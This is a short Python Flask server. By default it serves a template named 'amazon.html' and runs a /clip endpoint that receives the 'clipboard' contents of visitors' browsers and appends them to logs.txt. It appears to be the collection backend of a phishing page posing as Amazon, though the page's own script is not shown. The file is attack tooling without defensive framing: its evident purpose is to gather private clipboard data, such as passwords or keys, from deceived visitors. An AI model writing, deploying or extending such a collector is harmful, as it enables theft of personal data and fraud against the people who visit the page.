from flask import Flask, render_template, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    template = os.getenv("FLASK_TEMPLATE", "amazon.html")
    return render_template(template)

@app.route('/clip', methods=["POST"])
def get_clip():
    data = request.get_json()
    clipboard = data.get("clipboard")
    with open("logs.txt", "a") as f:
        f.write(clipboard + "\n")
    return "Received", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
